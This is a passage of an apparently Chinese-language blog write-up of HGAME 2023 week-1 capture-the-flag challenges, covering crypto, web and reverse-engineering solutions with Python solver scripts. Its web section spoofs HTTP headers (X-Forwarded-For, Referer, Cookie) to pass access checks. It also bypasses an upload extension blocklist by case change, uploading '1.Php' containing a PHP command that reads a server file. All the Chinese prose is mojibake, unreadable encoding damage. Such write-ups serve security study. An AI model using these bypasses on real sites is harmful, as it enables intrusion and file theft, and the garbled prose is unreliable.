´è¯‘äº†ï¼Œä½†æ˜¯æ€ä¹ˆçœ‹è¿™éƒ½ä¸åƒæ˜¯äººèƒ½çœ‹æ‡‚çš„ï¼Œè¿˜æ²¡ç­‰tr0ubleååº”è¿‡æ¥ï¼Œåˆä¸€é€šç”µè¯æ‰“æ¥ï¼Œä¾ç„¶æ˜¯æ»´ç­”æ»´ç­”çš„å£°éŸ³ã€‚tr0ubleæƒ³åˆ°å…”å…”ä¹Ÿåœ¨å­¦ä¹ å¯†ç å­¦ï¼Œäºæ˜¯ä¸è´Ÿè´£ä»»åœ°æŠŠå¯†æ–‡éƒ½äº¤ç»™äº†å…”å…”ï¼Œå…”å…”æ”¶åˆ°å¯†æ–‡åéšä¾¿çœ‹äº†ä¸€çœ¼å°±ä¸å±‘åœ°è¯´â€è¿™ä¹ˆç®€å•éƒ½ä¸ä¼šï¼Ÿè‡ªå·±è§£å»ï¼Œåˆ«è€½è¯¯æˆ‘æŠ¢è½¦ç¥¨â€ã€‚</p><p>flagä¸ºæœ€åå¾—åˆ°çš„ç»“æœå¥—ä¸Šhgame{}, flagä¸­å­—æ¯å‡ä¸ºå°å†™</p></blockquote><p>txtæ–‡ä»¶ä¸­æœ‰æç¤ºï¼š</p><p><code>å‡ ä¸ªæ˜ŸæœŸå‰ï¼Œæˆ‘ä»¬æ”¶åˆ°ä¸€ä¸ªç¥ç§˜çš„æ¶ˆæ¯ã€‚ä½†æ˜¯è¿™ä¸ªæ¶ˆæ¯è¢«é‡é‡åŠ å¯†ï¼Œæˆ‘ä»¬ä¸çŸ¥é“å®ƒçš„çœŸæ­£å«ä¹‰æ˜¯ä»€ä¹ˆã€‚å”¯ä¸€çŸ¥é“çš„ä¿¡æ¯æ˜¯å…³äºå¯†é’¥çš„ï¼šâ€œåªæœ‰å€’ç€ç¿»è¿‡åå…«å±‚çš„ç¯±ç¬†æ‰èƒ½æŠµè¾¾åŒ—æ¬§ç¥è¯çš„ç»ˆç‚¹â€ã€‚</code></p><p>ä»wavæ–‡ä»¶ä¸­æ‰‹æ“æ‘©æ–¯å¯†ç ï¼š</p><p><code>----- ..--- ..--- ...-- . ..--.- .--. .-. .. .. -... .-.. -.-- ..--.- ..--.- .... --- -. .-- .- ..--.- .--- -- --. .... ..--.- ..-. --. -.- -.-. --.- .- --- --.- - -- ..-. .-.</code></p><p>è§£ç ï¼š<code>0223e_priibly__honwa_jmgh_fgkcqaoqtmfr</code></p><p>æ ¹æ®txtæç¤ºï¼Œå­—ç¬¦ä¸²é€†åº + æ …æ å¯†ç ï¼ˆ18æ ï¼‰ å¾—åˆ°ï¼š<code>rmocfhm_wo_ybipe2023_ril_hnajg_katfqqg</code></p><p>ç”± <code>2023</code> çŒœæµ‹ <code>ybipe</code> å¯¹åº” <code>hgame</code>ï¼Œå°è¯•Vigenereå¯†ç ï¼Œå¯†é’¥ <code>vidar</code>ï¼Œå¾—åˆ°ï¼š<code>welcome_to_hgame2023_and_enjoy_hacking</code></p><p>flagï¼š<code>hgame&#123;welcome_to_hgame2023_and_enjoy_hacking&#125;</code></p><p>â€‹    </p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Classic-Childhood-Game"><a href="#Classic-Childhood-Game" class="headerlink" title="Classic Childhood Game"></a>Classic Childhood Game</h3><blockquote><p>å…”å…”æœ€è¿‘è¿·ä¸Šäº†ä¸€ä¸ªçº¯å‰ç«¯å®ç°çš„ç½‘é¡µå°æ¸¸æˆï¼Œä½†æ˜¯å¥½åƒæœ‰ç‚¹éš¾ç©ï¼Œå¿«å¸®å…”å…”é€šå…³æ¸¸æˆï¼</p></blockquote><p>jsæ¸¸æˆï¼ŒæŸ¥çœ‹æºç ï¼Œåœ¨ <code>/Res/Events.js</code> ä¸­æ‰¾åˆ°å…³é”®å‡½æ•°ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">mota</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> a = [<span class="string">&#x27;\x59\x55\x64\x6b\x61\x47\x4a\x58\x56\x6a\x64\x61\x62\x46\x5a\x31\x59\x6d\x35\x73\x53\x31\x6c\x59\x57\x6d\x68\x6a\x4d\x6b\x35\x35\x59\x56\x68\x43\x4d\x45\x70\x72\x57\x6a\x46\x69\x62\x54\x55\x31\x56\x46\x52\x43\x4d\x46\x6c\x56\x59\x7a\x42\x69\x56\x31\x59\x35&#x27;</span>];</span><br><span class="line">  (<span class="keyword">function</span> (<span class="params">b, e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> f = <span class="keyword">function</span> (<span class="params">g</span>) &#123;</span><br><span class="line">      <span class="keyword">while</span> (--g) &#123;</span><br><span class="line">        b[<span class="string">&#x27;push&#x27;</span>](b[<span class="string">&#x27;shift&#x27;</span>]());</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="title function_">f</span>(++e);</span><br><span class="line">  &#125;(a, <span class="number">0x198</span>));</span><br><span class="line">  <span class="keyword">var</span> b = <span class="keyword">function</span> (<span class="params">c, d</span>) &#123;</span><br><span class="line">    c = c - <span class="number">0x0</span>;</span><br><span class="line">    <span class="keyword">var</span> e = a[c];</span><br><span class="line">    <span class="keyword">if</span> (b[<span class="string">&#x27;CFrzVf&#x27;</span>] === <span class="literal">undefined</span>) &#123;</span><br><span class="line">      (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> g;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">var</span> i = <span class="title class_">Function</span>(<span class="string">&#x27;return\x20(function()\x20&#x27;</span> + <span class="string">&#x27;&#123;&#125;.constructor(\x22return\x20this\x22)(\x20)&#x27;</span> + <span class="string">&#x27;);&#x27;</span>);</span><br><span class="line">          g = <span class="title function_">i</span>();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (j) &#123;</span><br><span class="line">          g = <span class="variable language_">window</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> h = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#x27;</span>;</span><br><span class="line">        g[<span class="string">&#x27;atob&#x27;</span>] || (g[<span class="string">&#x27;atob&#x27;</span>] = <span class="keyword">function</span> (<span class="params">k</span>) &#123;</span><br><span class="line">          <span class="keyword">var</span> l = <span class="title class_">String</span>(k)[<span class="string">&#x27;replace&#x27;</span>](<span class="regexp">/=+$/</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">          <span class="keyword">var</span> m = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">var</span> n = <span class="number">0x0</span>, o, p, q = <span class="number">0x0</span>; p = l[<span class="string">&#x27;charAt&#x27;</span>](q++); ~p &amp;&amp; (o = n % <span class="number">0x4</span> ? o * <span class="number">0x40</span> + p : p, n++ % <span class="number">0x4</span>) ? m += <span class="title class_">String</span>[<span class="string">&#x27;fromCharCode&#x27;</span>](<span class="number">0xff</span> &amp; o &gt;&gt; (-<span class="number">0x2</span> * n &amp; <span class="number">0x6</span>)) : <span class="number">0x0</span>) &#123;</span><br><span class="line">            p = h[<span class="string">&#x27;indexOf&#x27;</span>](p);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">return</span> m;</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;());</span><br><span class="line">      b[<span class="string">&#x27;fqlkGn&#x27;</span>] = <span class="keyword">function</span> (<span class="params">g</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> h = <span class="title function_">atob</span>(g);</span><br><span class="line">        <span class="keyword">var</span> j = [];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> k = <span class="number">0x0</span>, l = h[<span class="string">&#x27;length&#x27;</span>]; k &lt; l; k++) &#123;</span><br><span class="line">          j += <span class="string">&#x27;%&#x27;</span> + (<span class="string">&#x27;00&#x27;</span> + h[<span class="string">&#x27;charCodeAt&#x27;</span>](k)[<span class="string">&#x27;toString&#x27;</span>](<span class="number">0x10</span>))[<span class="string">&#x27;slice&#x27;</span>](-<span class="number">0x2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">decodeURIComponent</span>(j);</span><br><span class="line">      &#125;;</span><br><span class="line">      b[<span class="string">&#x27;iBPtNo&#x27;</span>] = &#123;&#125;;</span><br><span class="line">      b[<span class="string">&#x27;CFrzVf&#x27;</span>] = !![];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> f = b[<span class="string">&#x27;iBPtNo&#x27;</span>][c];</span><br><span class="line">    <span class="keyword">if</span> (f === <span class="literal">undefined</span>) &#123;</span><br><span class="line">      e = b[<span class="string">&#x27;fqlkGn&#x27;</span>](e);</span><br><span class="line">      b[<span class="string">&#x27;iBPtNo&#x27;</span>][c] = e;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      e = f;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> e;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="title function_">alert</span>(<span class="title function_">atob</span>(<span class="title function_">b</span>(<span class="string">&#x27;\x30\x78\x30&#x27;</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨æ§åˆ¶å°ä¸­è¿è¡Œï¼Œå¼¹çª—å†…å®¹å³ä¸ºflagï¼š<code>hgame&#123;fUnnyJavascript&amp;FunnyM0taG4me&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="Become-A-Member"><a href="#Become-A-Member" class="headerlink" title="Become A Member"></a>Become A Member</h3><blockquote><p>å­¦æ ¡é€šçŸ¥æ”¾å¯’å‡å•¦ï¼Œå…”å…”å…´é«˜é‡‡çƒˆçš„æ‰“ç®—è´­ä¹°å›å®¶çš„è½¦ç¥¨ï¼Œè¿™æ—¶å…”å…”å‘ç°æˆä¸ºè´­ç¥¨ç½‘ç«™çš„ä¼šå‘˜è´¦æˆ·å¯ä»¥çœä¸‹ä¸€ç¬”moneyâ€¦â€¦</p><p>æƒ³æˆä¸ºä¼šå‘˜ä¹Ÿå¾ˆç®€å•ï¼Œåªéœ€è¦ä¸€ç‚¹ç‚¹HTTPçš„çŸ¥è¯†â€¦â€¦ç­‰ä¸‹ï¼ŒHTTPæ˜¯ä»€ä¹ˆï¼Œå¯ä»¥åƒå—</p></blockquote><p>è€ƒå¯ŸHTTPè¯·æ±‚å¤´ä¸­çš„User-Agentã€Cookieã€æ¥æº(Referer)å’Œæœ¬åœ°è®¿é—®(X-Forwarded-For)ã€‚</p><p>éœ€ä¾æ¬¡æ»¡è¶³ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Cute-Bunny</span><br><span class="line">Cookie: code=Vidar</span><br><span class="line">Referer: bunnybunnybunny.com</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line"></span><br><span class="line">JSON</span><br><span class="line">username=luckytoday</span><br><span class="line">password=happy123</span><br></pre></td></tr></table></figure><p>ä»¥JSONæ ¼å¼è¯·æ±‚ç™»å½•å³å¯ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>week-1.hgame.lwsec.cn:31450</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Cute-Bunny</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>bunnybunnybunny.com</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en-GB;q=0.8,en;q=0.7,zh-TW;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>code=Vidar</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>47</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;luckytoday&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;happy123&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><p>è¿”å›flagå€¼ï¼š<code>hgame&#123;H0w_ArE_Y0u_T0day?&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="Guess-Who-I-Am"><a href="#Guess-Who-I-Am" class="headerlink" title="Guess Who I Am"></a>Guess Who I Am</h3><blockquote><p>åˆšåŠ å…¥Vidarçš„å…”å…”è¿˜è®¤ä¸æ¸…åä¼šæˆå‘˜è¯¶ï¼Œå­¦é•¿è¦æ±‚çš„ç­”å¯¹100æ¬¡é—®é¢˜å¯å¤ªéš¾äº†ï¼Œä½ èƒ½å¸®å…”å…”å†™ä¸ªè„šæœ¬ç­”é¢˜å—ï¼Ÿ</p></blockquote><p>æŸ¥çœ‹æºç ï¼š</p><p><code>&lt;!-- Hint: https://github.com/Potat0000/Vidar-Website/blob/master/src/scripts/config/member.js --&gt;</code></p><p>è®¿é—®å‘ç°ä¸ºé¡µé¢é—®é¢˜çš„ç­”æ¡ˆï¼Œä»¥listæ–¹å¼æå–æ•°æ®ã€‚</p><p>å¦åœ¨jsæ–‡ä»¶ä¸­æœç´¢å‘ç°é¡µé¢çš„3ä¸ªè·¯ç”±ï¼š</p><p>è·å–é—®é¢˜ï¼š<code>/api/getQuestion</code>ï¼ŒéªŒè¯ç­”æ¡ˆï¼š<code>/api/verifyAnswer</code>ï¼Œè·å–åˆ†æ•°ï¼š<code>/api/getScore</code>ã€‚</p><p>pythonè„šæœ¬æ¨¡æ‹Ÿé¡µé¢100æ¬¡å›ç­”ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">data = [</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;id&quot;</span>: <span class="string">&quot;ba1van4&quot;</span>,</span><br><span class="line">        <span class="string">&quot;intro&quot;</span>: <span class="string">&quot;21çº§ / ä¸ä¼šRe / ä¸ä¼šç¾å·¥ / æ´»åœ¨æ¢¦é‡Œ / å–œæ¬¢åšä¸ä¼šçš„äº‹æƒ… / â—¼â—»ç²‰&quot;</span>,</span><br><span class="line">        <span class="string">&quot;avatar&quot;</span>: <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=kSt5er0OQMXROy28nzTia0A&amp;s=640&quot;</span>,</span><br><span class="line">        <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https://ba1van4.icu&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    ......</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> data:</span><br><span class="line">    dic[k[<span class="string">&quot;intro&quot;</span>]] = k[<span class="string">&quot;id&quot;</span>]</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">&#x27;http://week-1.hgame.lwsec.cn:xxxxx&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    r = s.get(url+<span class="string">&#x27;/api/getQuestion&#x27;</span>)</span><br><span class="line">    intro = json.loads(r.text)[<span class="string">&quot;message&quot;</span>]</span><br><span class="line">    <span class="comment">#print(intro)</span></span><br><span class="line">    r = s.post(url+<span class="string">&#x27;/api/verifyAnswer&#x27;</span>, data=&#123;<span class="string">&#x27;id&#x27;</span>:dic[intro]&#125;)</span><br><span class="line">    r = s.get(url+<span class="string">&#x27;/api/getScore&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>è¿è¡Œå¾—åˆ°100æ¬¡å¾ªç¯åçš„ç»“æœï¼š<code>&#123;&quot;message&quot;:&quot;hgame&#123;Guess_who_i_am^Happy_Crawler&#125;&quot;&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="Show-Me-Your-Beauty"><a href="#Show-Me-Your-Beauty" class="headerlink" title="Show Me Your Beauty"></a>Show Me Your Beauty</h3><blockquote><p>ç™»é™†äº†ä¹‹å‰è·å–çš„ä¼šå‘˜è´¦å·ä¹‹åï¼Œå…”å…”æƒ³æ‰¾ä¸€å¼ è‡ªå·±çš„å¯çˆ±ç…§ç‰‡ï¼Œä¸Šä¼ åˆ°ä¸ªäººä¿¡æ¯çš„å¤´åƒä¸­ :D</p><p>ä¸è¿‡å¥½åƒå¯ä»¥ä¸Šä¼ äº›å¥‡æ€ªåç¼€åçš„æ–‡ä»¶è¯¶ XD</p></blockquote><p>å›¾ç‰‡æ–‡ä»¶ä¸Šä¼ ï¼ŒæŠ“åŒ…å°è¯•ï¼Œæ–‡ä»¶åå­˜åœ¨å…³é”®å­—é»‘åå•ï¼ŒåŒ…æ‹¬ <code>php/phtml/ini/htaccess</code> ç­‰ï¼›</p><p>æµ‹è¯•å‘ç°å¯ä»¥å¤§å°å†™ç»•è¿‡ï¼Œå°†æ–‡ä»¶ååç¼€ä¿®æ”¹ä¸º <code>Php</code>ï¼Œå†…å®¹ä¿®æ”¹ä¸º <code>&lt;?=`cat /flag`;</code>ï¼Œä¸Šä¼  <code>1.Php</code>ï¼Œè®¿é—®å³å¯å¾—åˆ°flagï¼š<code>hgame&#123;Unsave_F1L5_SYS7em_UPL0ad!&#125;</code>ã€‚</p><p>â€‹    </p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="test-your-IDA"><a href="#test-your-IDA" class="headerlink" title="test your IDA"></a>test your IDA</h3><blockquote><p>ç­¾åˆ°</p></blockquote><p>IDAæ‰“å¼€æŸ¥çœ‹å­—ç¬¦ä¸²æœ‰flagï¼š<code>hgame&#123;te5t_y0ur_IDA&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="easyasm"><a href="#easyasm" class="headerlink" title="easyasm"></a>easyasm</h3><blockquote><p>éå¸¸ç®€å•çš„æ±‡ç¼–</p></blockquote><p>å…³é”®æ“ä½œåœ¨ <code>xor eax, 33h</code>ï¼Œå°†ç»“æœå¼‚æˆ–0x33å³å¯è¿˜åŸï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">0x5b</span>,<span class="number">0x54</span>,<span class="number">0x52</span>,<span class="number">0x5e</span>,<span class="number">0x56</span>,<span class="number">0x48</span>,<span class="number">0x44</span>,<span class="number">0x56</span>,<span class="number">0x5f</span>,<span class="number">0x50</span>,<span class="number">0x3</span>,<span class="number">0x5e</span>,<span class="number">0x56</span>,<span class="number">0x6c</span>,<span class="number">0x47</span>,<span class="number">0x3</span>,<span class="number">0x6c</span>,<span class="number">0x41</span>,<span class="number">0x56</span>,<span class="number">0x6c</span>,<span class="number">0x44</span>,<span class="number">0x5c</span>,<span class="number">0x41</span>,<span class="number">0x2</span>,<span class="number">0x57</span>,<span class="number">0x12</span>,<span class="number">0x4e</span>]</span><br><span class="line">flag = [k^<span class="number">0x33</span> <span class="keyword">for</span> k <span class="keyword">in</span> c]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;welc0me_t0_re_wor1d!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="easyenc"><a href="#easyenc" class="headerlink" title="easyenc"></a>easyenc</h3><blockquote><p>easyenc</p></blockquote><p>ä»£ç é€»è¾‘ä¸ºé€å­—ç¬¦å…ˆå¼‚æˆ–0x32åå‡86ï¼Œé€†å‘è¿˜åŸï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">4</span>, <span class="number">255</span>, <span class="number">253</span>,   <span class="number">9</span>,   <span class="number">1</span>, <span class="number">243</span>, <span class="number">176</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">5</span>, </span><br><span class="line">  <span class="number">240</span>, <span class="number">173</span>,   <span class="number">7</span>,   <span class="number">6</span>,  <span class="number">23</span>,   <span class="number">5</span>, <span class="number">235</span>,  <span class="number">23</span>, <span class="number">253</span>,  <span class="number">23</span>, </span><br><span class="line">  <span class="number">234</span>,   <span class="number">1</span>, <span class="number">238</span>,   <span class="number">1</span>, <span class="number">234</span>, <span class="number">177</span>,   <span class="number">5</span>, <span class="number">250</span>,   <span class="number">8</span>,   <span class="number">1</span>, </span><br><span class="line">   <span class="number">23</span>, <span class="number">172</span>, <span class="number">236</span>,   <span class="number">1</span>, <span class="number">234</span>, <span class="number">253</span>, <span class="number">240</span>,   <span class="number">5</span>,   <span class="number">7</span>,   <span class="number">6</span>, </span><br><span class="line">  <span class="number">249</span>]</span><br><span class="line"></span><br><span class="line">flag = [((k+<span class="number">86</span>)^<span class="number">0x32</span>) &amp; <span class="number">0xff</span> <span class="keyword">for</span> k <span class="keyword">in</span> c]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;4ddit1on_is_a_rever5ible_0peration&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="a-cup-of-tea"><a href="#a-cup-of-tea" class="headerlink" title="a_cup_of_tea"></a>a_cup_of_tea</h3><blockquote><p>å…”å…”çš„å®¶äººéƒ½çˆ±å–èŒ¶ï¼Œæ‰€ä»¥å…”å…”å¸¦äº†äº›èŒ¶å¶å›å»</p></blockquote><p>é­”æ”¹äº†deltaä¸º <code>0xABCDEF23</code> çš„Teaç®—æ³•ï¼Œç”¨è§£å¯†ç®—æ³•è¿˜åŸï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    x = <span class="number">0xABCDEF23</span> * <span class="number">32</span></span><br><span class="line">    delta = <span class="number">0xABCDEF23</span></span><br><span class="line">    k0 = k[<span class="number">0</span>]</span><br><span class="line">    k1 = k[<span class="number">1</span>]</span><br><span class="line">    k2 = k[<span class="number">2</span>]</span><br><span class="line">    k3 = k[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    c = [<span class="number">0x2E63829D</span>, <span class="number">0xC14E400F</span>, <span class="number">0x9B39BFB9</span>, <span class="number">0x5A1F8B14</span>, <span class="number">0x61886DDE</span>, <span class="number">0x6565C6CF</span>, <span class="number">0x9F064F64</span>, <span class="number">0x236A43F6</span>, <span class="number">0x7D6B</span>]</span><br><span class="line">    cc = [long_to_bytes(k)[::-<span class="number">1</span>] <span class="keyword">for</span> k <span class="keyword">in</span> c]</span><br><span class="line">    key = [<span class="number">0x12345678</span>, <span class="number">0x23456789</span>, <span class="number">0x34567890</span>, <span class="number">0x45678901</span>]</span><br><span class="line">    flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)//<span class="number">2</span>):</span><br><span class="line">        d = decrypt(c[<span class="number">2</span>*i:<span class="number">2</span>*(i+<span class="number">1</span>)], key)</span><br><span class="line">        flag += long_to_bytes(d[<span class="number">0</span>])[::-<span class="number">1</span>]+long_to_bytes(d[<span class="number">1</span>])[::-<span class="number">1</span>]</span><br><span class="line">    flag += long_to_bytes(c[-<span class="number">1</span>])[::-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;Tea_15_4_v3ry_h3a1thy_drlnk&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="encode"><a href="#encode" class="headerlink" title="encode"></a>encode</h3><blockquote><p>å…”å…”æŠŠè‡ªå·±è¡Œæç®±çš„å¯†ç ç”¨ä¸€ç§ç¼–ç å†™åœ¨äº†çº¸æ¡ä¸Šï¼Œä½†ä»–å¿˜äº†æ€ä¹ˆè§£å¯†ï¼Œä½ 